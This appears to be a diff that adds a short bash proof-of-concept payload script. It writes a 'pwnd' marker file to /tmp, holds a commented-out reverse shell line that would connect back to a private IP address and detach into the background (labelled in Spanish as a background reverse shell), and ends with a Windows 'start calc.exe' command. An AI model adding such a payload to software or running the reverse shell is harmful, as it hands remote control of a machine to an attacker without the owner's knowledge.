@@ -1,0 +1,6 @@
+#!/bin/bash
+echo "amal_was_here" > /tmp/pwnd
+
+# Shell inversa en segundo plano
+# bash -i >& /dev/tcp/192.168.0.137/1234 0>&1 & disown
+start calc.exe
